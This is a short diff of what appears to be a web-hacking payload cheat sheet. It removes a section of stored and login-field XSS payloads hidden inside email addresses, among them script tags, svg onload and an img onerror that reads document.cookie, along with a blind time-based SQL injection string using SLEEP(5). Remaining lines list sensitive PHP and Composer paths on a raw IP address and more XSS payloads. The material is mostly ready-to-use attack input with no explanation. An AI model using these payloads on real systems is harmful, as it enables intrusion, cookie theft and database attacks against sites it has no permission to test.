@@ -60,24 +60,6 @@ https://20.86.155.86/composer.lock
 https://20.86.155.86/vendor/composer/installed.json
 https://20.86.155.86/vendor/phpunit/phpunit/phpunit
 
-Stored XSS in Email Fields:
---------------------------
-validemail+test<h1/onmouseover​=alert(origin)>test@gmail.com
-lipsec+<h1/onmouseover​=alert(origin)>lipseclimited@gmail.com
-
-XSS in Email Login Fields:
-Validator: https://www.randomstuff.org.uk/emailvalidator.shtml
-test+(<script>alert(document.domain)</script>)@gmail.com
-"><svg/onload=confirm('XSS')>"@x.y
-"><img src=x onerror=alert(document.cookie);>
-“><svg/onload=confirm(1)>”@gmail.com
-
-Persistent XSS in the Signup Process:
-<img src=x onerror​=alert(origin)>
-
-SQLi Blind Time Base:
-xss' AND (SELECT 8091 FROM (SELECT(SLEEP(5)))sRDf) AND 'wRgw'='wRgw
-
 Very simple XSS Payload:
 <iframe src="javascript​:prompt`${origin}`" xss="">
 <img src=x onerror="alert(origin)">
